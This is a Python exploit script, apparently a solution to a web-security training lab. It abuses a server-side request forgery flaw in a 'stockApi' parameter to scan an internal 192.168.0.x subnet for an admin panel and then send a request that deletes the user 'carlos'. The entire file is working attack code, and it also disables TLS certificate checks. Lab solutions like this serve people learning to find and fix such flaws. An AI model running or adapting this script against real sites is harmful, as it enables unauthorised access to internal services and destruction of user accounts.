import sys
import urllib3
import requests

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def ssrf_func(url):
    admin_add = 0
    for i in range(1,256):
        ssrf_payload = "http://192.168.0.%s:8080/admin"%i
        vulnerable_redirect = "/product/stock"
        params = {'stockApi':ssrf_payload}
        r = requests.post(url + vulnerable_redirect,data = params,verify=False)
        # print(r.status_code)
        # print(i)
        if r.status_code == 200:    
            admin_add = i
            break
    
    print("admin's ip = 192.168.0.%s"%admin_add)
    ssrf_payload_2 = "http://192.168.0.%s:8080/admin/delete?username=carlos"%admin_add
    params2 = {'stockApi':ssrf_payload_2}
    r=requests.post(url+vulnerable_redirect,data=params2,verify=False)

def main():
    if len(sys.argv) != 2:
        print("[+]usage: %s <url>"%sys.argv[0])
    
    print("[+]deleting carlos...")
    url = sys.argv[1]
    ssrf_func(url)

if __name__ == "__main__":
    main()